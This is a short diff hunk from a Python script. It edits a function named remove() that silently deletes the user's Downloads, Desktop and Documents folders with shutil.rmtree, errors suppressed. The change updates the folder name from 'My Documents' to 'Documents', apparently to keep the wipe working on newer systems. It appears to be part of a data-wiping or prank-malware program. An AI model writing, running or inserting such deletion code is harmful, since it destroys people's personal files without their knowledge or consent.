@@ -32,7 +32,7 @@ def remove():
     subprocess.call("dir",shell=True)
     
     shutil.rmtree('Downloads',ignore_errors=True)
-    shutil.rmtree('My Documents',ignore_errors=True)
+    shutil.rmtree('Documents',ignore_errors=True)
     shutil.rmtree('Desktop',ignore_errors=True)
    
 
